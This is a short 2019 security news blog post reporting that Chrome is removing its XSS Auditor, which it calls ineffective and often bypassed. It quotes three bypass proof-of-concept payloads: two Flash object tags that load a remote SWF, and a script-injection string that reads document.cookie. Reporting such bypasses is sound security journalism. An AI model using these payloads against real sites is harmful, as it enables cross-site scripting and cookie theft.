+++
title = "XSS Auditor no more part of Google Chrome"
date = "2019-07-16"
author = "Sandeep Kamble"
cover = ""
tags = ["News"]
description = "Yes, you heard correct Google Chromium devs announced the news about XSS auditor. The XSS auditor time and again bypassed by the client security researcher to execute the malicious javascript, and this may be the primary reason to be deprecated and removed from the Google Chrome browser."
showFullContent = false
+++

Yes, you heard correct Google Chromium devs announced the news about XSS auditor. 
The XSS auditor time and again bypassed by the client security researcher to execute the malicious javascript, and this may be the primary reason to be deprecated and removed from the Google Chrome browser.

The anti-cross site scripting engine (XSS auditor) is not covering all XSS type such as DOM-based XSS, mXSS, and persistent XSS. XSS auditor mostly working on for the reflected XSS, and this is again can be bypassed by tricking the Javascript payload.

Google security team bypassed XSS auditor protection and most of the bypasses working. Here (1 , 2) you can find the different bypasses found by the researcher.

According to the discussion on Google group, the XSS auditor is also leading the cross-site info leaks and fixing them all tedious job.

in 2016 again researcher Masato Kinugawa from Japan bypassed XSS Auditor using following payloads:

```html
PoC1: 
<object allowscriptaccess=always>
<param name=url value=https://l0.cm/xss.swf>

PoC2:
<object allowscriptaccess=always>
<param name=code value=https://l0.cm/xss.swf>

This PoC3 still work on Chrome by James Lee: 

"/>`;prompt`${document.cookie}`</script><script>`
```

Last year MS decided to remove the anti-XSS engine and now this year, Google chrome chose to remove the XSS auditor. It is clear to everyone regex-based filter leads to false-positive, and results are crossing the expectation of the user.
